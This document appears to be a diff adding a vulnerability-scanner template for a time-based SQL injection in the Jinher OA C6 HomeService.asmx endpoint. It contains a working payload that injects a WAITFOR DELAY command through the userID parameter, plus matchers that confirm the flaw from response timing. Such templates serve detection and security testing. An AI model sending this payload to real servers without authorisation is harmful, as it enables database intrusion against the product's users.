@@ -1,0 +1,32 @@
+id: poc-yaml-jinher-c6-homeservice-asmx-sqli
+info:
+  name: 金和OA C6 HomeService.asmx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+
+http:
+  - raw:
+      - |
+        GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "themes/default/images/m.png"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
